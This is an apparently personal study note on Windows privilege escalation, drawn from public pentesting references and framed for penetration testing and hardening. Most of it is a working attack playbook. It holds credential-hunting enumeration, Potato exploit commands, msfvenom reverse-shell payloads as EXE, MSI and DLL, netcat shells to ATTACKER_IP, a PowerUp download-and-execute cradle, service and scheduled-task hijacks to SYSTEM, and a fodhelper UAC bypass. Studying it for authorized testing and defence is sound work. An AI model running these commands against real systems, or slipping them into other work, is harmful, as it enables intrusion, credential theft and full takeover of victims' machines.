---
title: Windows Privilege Escalation
tags:
  - intermediate
  - fundamentals
  - windows
  - privilege-escalation
  - post-exploitation
topic: Post-Exploitation
difficulty: intermediate
created: 2026-03-23
updated: 2026-04-04
source: HackTricks Windows privilege escalation, PayloadsAllTheThings, WinPEAS
---

# Windows Privilege Escalation

## Overview
Windows privilege escalation covers techniques to move from a low-privileged user account to `NT AUTHORITY\SYSTEM` or local/domain Administrator on a Windows machine. These techniques are central to penetration testing, red teaming, and understanding what defenders must harden.

## Why It Matters in Security
Most initial access on Windows gives limited user privileges. Escalating to SYSTEM or local admin is required to dump credentials, pivot, disable AV, and achieve the goals of an engagement. Defenders use this knowledge to audit configurations and apply hardening.

---

## Initial Enumeration Checklist

Run immediately after landing a shell:

```cmd
:: Who are you?
whoami
whoami /priv
whoami /groups

:: System info (OS version, hotfixes — look for unpatched vulns)
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

:: Hotfixes installed
wmic qfe get Caption,Description,HotFixID,InstalledOn

:: Network
ipconfig /all
netstat -ano
route print
arp -a

:: Users and groups
net user
net localgroup administrators
net localgroup

:: Running processes
tasklist /v
wmic process list full

:: Services
sc query
wmic service list full
sc qc ServiceName

:: Scheduled tasks
schtasks /query /fo LIST /v

:: Installed programs
wmic product get name,version
dir "C:\Program Files"
dir "C:\Program Files (x86)"

:: AlwaysInstallElevated (registry check)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: Stored credentials
cmdkey /list
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\

:: Autologon credentials in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

:: Passwords in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

:: Interesting files
dir /s /b *pass* *cred* *config* *secret* *.kdbx 2>nul
dir "C:\Users" /a
type C:\Windows\System32\drivers\etc\hosts
```

---

## Technique 1 — SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege (Potato Attacks)

The most common privesc on Windows services. If `whoami /priv` shows either privilege — you can almost certainly get SYSTEM.

```cmd
whoami /priv
:: Look for: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
```

**Potato exploits** abuse these privileges to impersonate SYSTEM:

| Tool | Targets | Notes |
|---|---|---|
| **PrintSpoofer** | Windows 10, Server 2016/2019 | Most reliable on modern systems |
| **GodPotato** | Windows Server 2012–2022, Win8–11 | Broad compatibility |
| **JuicyPotato** | Windows < Server 2019 / Win10 1809 | Requires CLSID selection |
| **RoguePotato** | Server 2019+, Win10 1809+ | Works where JuicyPotato doesn't |
| **SweetPotato** | Modern systems | Combines multiple techniques |

```cmd
:: PrintSpoofer
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -c "nc.exe ATTACKER_IP 4444 -e cmd.exe"

:: GodPotato
GodPotato.exe -cmd "cmd.exe /c whoami"
GodPotato.exe -cmd "nc.exe ATTACKER_IP 4444 -e cmd.exe"

:: JuicyPotato (need CLSID for target OS)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe ATTACKER_IP 4444 -e cmd.exe" -t * -c {CLSID}
```

---

## Technique 2 — Unquoted Service Paths

If a service's binary path contains spaces and is not enclosed in quotes, Windows searches for the executable in each path segment — allowing binary planting.

```cmd
:: Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: Example vulnerable path:
:: C:\Program Files\Vulnerable Service\sub folder\service.exe
:: Windows will try:
:: C:\Program.exe
:: C:\Program Files\Vulnerable.exe      ← plant here if writable
:: C:\Program Files\Vulnerable Service\sub.exe
```

```cmd
:: Check if path segments are writable
icacls "C:\Program Files\Vulnerable Service\"

:: Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Vulnerable.exe

:: Copy to writable path and restart service
copy Vulnerable.exe "C:\Program Files\Vulnerable.exe"
sc stop VulnerableService
sc start VulnerableService
```

---

## Technique 3 — Weak Service Permissions

If you have permission to modify a service's binary path, redirect it to your payload.

```cmd
:: Check service permissions (PowerShell)
Get-Acl "HKLM:\System\CurrentControlSet\Services\ServiceName" | Format-List

:: Or use accesschk (Sysinternals)
accesschk.exe -uwcqv "Everyone" * 2>nul
accesschk.exe -uwcqv "Authenticated Users" * 2>nul
accesschk.exe -uwcqv "Users" * 2>nul

:: If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG — exploit:
sc config ServiceName binpath= "nc.exe ATTACKER_IP 4444 -e cmd.exe"
sc stop ServiceName
sc start ServiceName
```

---

## Technique 4 — AlwaysInstallElevated

If both registry keys are set to 1, any user can install MSI packages as SYSTEM.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both must be 0x1

:: Generate malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi

:: Install it (runs as SYSTEM)
msiexec /quiet /qn /i evil.msi
```

---

## Technique 5 — Stored Credentials

```cmd
:: Cmdkey stored credentials
cmdkey /list

:: Use stored credential with runas
runas /savecred /user:DOMAIN\Administrator cmd.exe

:: Autologon credentials in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
:: Look for: DefaultUserName, DefaultPassword, DefaultDomainName

:: Search files for passwords
findstr /si password *.txt *.xml *.ini *.config 2>nul
dir /s /b *unattend* *sysprep* *web.config* *php.ini* 2>nul
```

---

## Technique 6 — Token Impersonation

With `SeImpersonatePrivilege`, use tools to impersonate higher-privilege tokens:

```cmd
:: In Meterpreter
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
getuid

:: Or getsystem
getsystem
```

---

## Technique 7 — DLL Hijacking

If a service or program loads DLLs from a writable directory, plant a malicious DLL.

```cmd
:: Find missing DLLs with Process Monitor (Sysinternals) on a local lab
:: Or use WinPEAS to highlight DLL hijacking candidates

:: Generate malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o vuln.dll

:: Copy to the searched path
copy vuln.dll "C:\writable\path\missing.dll"
:: Trigger service restart or application reload
```

---

## Technique 8 — Scheduled Task Abuse

```cmd
:: List tasks with their run-as user
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

:: If a task runs a script you can write to:
:: Add payload to the script file
echo C:\nc.exe ATTACKER_IP 4444 -e cmd.exe >> C:\writable\task_script.bat

:: Create a new task (if permissions allow)
schtasks /create /tn "UpdateTask" /tr "C:\nc.exe ATTACKER_IP 4444 -e cmd.exe" /sc onlogon /ru SYSTEM
```

---

## Technique 9 — Kernel / CVE Exploits

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get HotFixID

:: Search for local privilege escalation exploits
searchsploit windows local privilege escalation
searchsploit "Windows 10 1903"
```

**Notable Windows kernel/local exploits:**
| CVE | Name | Target |
|---|---|---|
| CVE-2021-36934 | HiveNightmare / SeriousSAM | Windows 10 21H1 — SAM readable by Users |
| CVE-2021-1732 | Win32k privesc | Windows 10 / Server 2019 |
| CVE-2020-0787 | BITS service | Windows 7–10 |
| CVE-2019-1388 | UAC bypass via cert dialog | Windows 7–10 |
| MS16-032 | Secondary Logon Handle | Windows 7–10 / Server 2008–2012 |

---

## Automated Tools

```cmd
:: WinPEAS (most comprehensive — run first)
winPEASx64.exe
winPEASx86.exe
winPEASany.exe

:: PowerUp (PowerShell)
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
Invoke-AllChecks

:: Seatbelt (post-exploitation enumeration)
Seatbelt.exe -group=all

:: AccessChk (Sysinternals — legitimate tool)
accesschk.exe -uwcqv "Everyone" *
```

---

## UAC Bypass (When Already Local Admin but not Elevated)

```powershell
# Check UAC level
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

# Common bypass: fodhelper.exe
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force
Start-Process fodhelper.exe
```

---

## Key Terms
| Term | Definition |
|---|---|
| SYSTEM | Highest privilege level on Windows; more powerful than Administrator |
| SeImpersonatePrivilege | Allows a process to impersonate a client; often held by service accounts |
| UAC | User Account Control — elevation prompt; prevents accidental admin actions |
| Token | Access token attached to a process defining its security context and privileges |
| CLSID | Class Identifier — COM object identifier; used in Potato attacks |
| MSI | Microsoft Installer package format |

## Related Notes
- Active-Directory
- Windows-Commands
- Metasploit
- Linux-Privilege-Escalation

## Sources

PEASS-ng Team. (2024). *WinPEAS: Windows privilege escalation awesome script*. GitHub. https://github.com/peass-ng/PEASS-ng

Swisskyrepo. (2024). *PayloadsAllTheThings: Windows privilege escalation*. GitHub. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Carlos Polop. (2024). *Windows local privilege escalation*. HackTricks. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

Fortra (itm4n). (2020). *PrintSpoofer: Abusing impersonation privileges on Windows 10 and server 2019*. GitHub. https://github.com/itm4n/PrintSpoofer

BeichenDream. (2023). *GodPotato: New potatoes for Windows privilege escalation*. GitHub. https://github.com/BeichenDream/GodPotato

## See Also

- Penetration-Testing-Methodology
- Metasploit
- Netcat
- BloodHound
- Windows-Commands
- Linux-Privilege-Escalation

---
<- [[Fundamentals-MOC]]